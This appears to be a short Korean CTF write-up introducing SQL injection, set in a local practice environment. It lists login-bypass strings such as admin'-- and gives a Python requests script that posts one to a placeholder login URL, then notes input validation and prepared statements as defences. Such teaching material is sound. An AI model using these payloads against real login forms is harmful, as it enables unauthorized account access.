---
layout: post
title: "CTF 입문 - 웹 해킹 기초 문제 풀이"
date: 2026-04-05
category: 웹
author: WTCY
excerpt: "CTF에서 자주 출제되는 웹 해킹 유형과 기초 풀이 기법을 정리합니다."
---

## 문제 환경

- 플랫폼: 연습용 로컬 환경
- 분류: Web
- 난이도: ★☆☆☆☆

## 취약점 분석

### SQL Injection 기초

가장 기본적인 웹 취약점 중 하나인 SQL Injection입니다.

```sql
' OR '1'='1
' OR 1=1--
admin'--
```

### 풀이 과정

1. 로그인 폼에서 username 파라미터 확인
2. `'` 입력 시 에러 발생 → SQL Injection 가능성 확인
3. `admin'--` 입력으로 패스워드 우회

```python
import requests

url = "http://target.com/login"
payload = {
    "username": "admin'--",
    "password": "anything"
}
r = requests.post(url, data=payload)
print(r.text)
```

## 배운 점

- 입력값 검증의 중요성
- Prepared Statement 필요성
- 에러 메시지 노출이 공격자에게 정보를 줄 수 있음

## 참고 자료

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
